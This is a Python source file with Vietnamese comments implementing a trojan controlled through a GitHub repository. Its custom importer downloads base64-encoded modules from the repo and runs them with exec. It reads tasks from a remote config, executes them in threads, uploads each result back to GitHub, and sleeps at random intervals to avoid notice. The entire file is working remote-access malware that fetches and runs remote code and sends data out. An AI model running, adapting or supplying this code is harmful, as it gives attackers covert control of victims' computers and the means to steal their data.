import base64
import github3  # Thư viện tương tác với GitHub API
import importlib  # Thư viện để import động các module
import json
import random
import sys
import threading
import time
from datetime import datetime


def github_connect():
    """Kết nối tới GitHub repository"""
    with open('mytoken.txt') as f:
        token = f.read()  # Đọc token xác thực từ file
    user = 'lwd3c'  # Tên người dùng GitHub
    sess = github3.login(token=token)  # Đăng nhập vào GitHub
    return sess.repository(user, 'bhptrojan')  # Trả về repository


def get_file_contents(dirname, module_name, repo):
    """Lấy nội dung file từ repository"""
    return repo.file_contents(f'{dirname}/{module_name}').content


class Trojan:
    def __init__(self, id):
        """Khởi tạo đối tượng Trojan"""
        self.id = id  # ID của trojan
        self.config_file = f'{id}.json'  # File cấu hình
        self.data_path = f'data/{id}/'  # Đường dẫn lưu dữ liệu
        self.repo = github_connect()  # Kết nối tới repo


    def get_config(self):
        """Lấy và xử lý file cấu hình"""
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))  # Giải mã và parse JSON
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])  # Import các module cần thiết
        return config


    def module_runner(self, module):
        """Chạy module và lưu kết quả"""
        result = sys.modules[module].run()  # Chạy module
        self.store_module_result(result)  # Lưu kết quả


    def store_module_result(self, data):
        """Lưu kết quả lên GitHub"""
        message = datetime.now().isoformat()  # Tạo timestamp
        remote_path = f'data/{self.id}/{message}.data'  # Đường dẫn lưu trữ
        bindata = bytes('%r' % data, 'utf-8')  # Chuyển dữ liệu sang dạng bytes
        self.repo.create_file(remote_path, message, base64.b64encode(
            bindata))  # Tạo file mới trên GitHub


    def run(self):
        """Hàm chính để chạy trojan"""
        while True:
            config = self.get_config()  # Lấy cấu hình
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],))  # Tạo thread mới cho mỗi task
                thread.start()  # Chạy thread
                time.sleep(random.randint(1, 10))  # Delay ngẫu nhiên 1-10s
            time.sleep(random.randint(30*60, 3*60*60))  # Delay ngẫu nhiên 30p-3h


class GitImporter:
    """Lớp GitImporter để import các module từ GitHub"""

    def __init__(self):
        """Khởi tạo đối tượng GitImporter"""
        self.current_module_code = ""  # Lưu mã nguồn của module hiện tại

    def find_module(self, name, path=None):
        """Tìm và tải module từ GitHub"""
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()  # Kết nối tới repo
        new_library = get_file_contents(
            'modules', f'{name}.py', self.repo)  # Lấy nội dung file module
        if new_library is not None:
            self.current_module_code = base64.b64decode(
                new_library)  # Giải mã base64
            return self

    def load_module(self, name):
        """Tải và thực thi module"""
        spec = importlib.util.spec_from_loader(
            name, loader=None, origin=self.repo.git_url)  # Tạo spec cho module
        new_module = importlib.util.module_from_spec(
            spec)  # Tạo module mới từ spec
        exec(self.current_module_code, new_module.__dict__)  # Thực thi mã nguồn
        sys.modules[spec.name] = new_module  # Thêm module vào sys.modules
        return new_module


if __name__ == '__main__':
    # Thêm GitImporter vào sys.meta_path để có thể import module từ GitHub
    sys.meta_path.append(GitImporter())
    # Khởi tạo đối tượng Trojan với ID 'abc'
    trojan = Trojan('abc')
    # Chạy trojan
    trojan.run()
